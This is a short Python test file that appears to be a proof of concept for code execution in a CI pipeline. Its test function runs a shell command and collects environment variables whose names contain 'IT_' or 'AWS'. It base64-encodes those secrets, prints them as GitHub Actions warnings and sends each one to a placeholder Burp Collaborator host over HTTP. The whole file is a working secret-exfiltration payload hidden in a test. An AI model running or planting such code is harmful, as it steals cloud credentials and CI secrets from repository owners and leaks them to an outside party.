import os
import urllib.request
import base64

def test_rce_poc():
    # Execute a shell command to prove code execution
    os.system('echo "hacked"')

    # 1. Collect secrets
    for key, value in os.environ.items():
        if "IT_" in key or "AWS" in key:
            encoded_value = base64.b64encode(value.encode('utf-8')).decode('utf-8')
            
            print(f"::warning title=POC Secret Dump::{key} = {encoded_value}")

            # 2. Out-of-band network ping with the encoded value
            url = f"http://YOUR_BURP_COLLABORATOR_URL.oastify.com?key={key}&id={encoded_value}" 
            
            try:
                with urllib.request.urlopen(url, timeout=3) as response:
                    pass
            except Exception:
                pass
                
    assert True
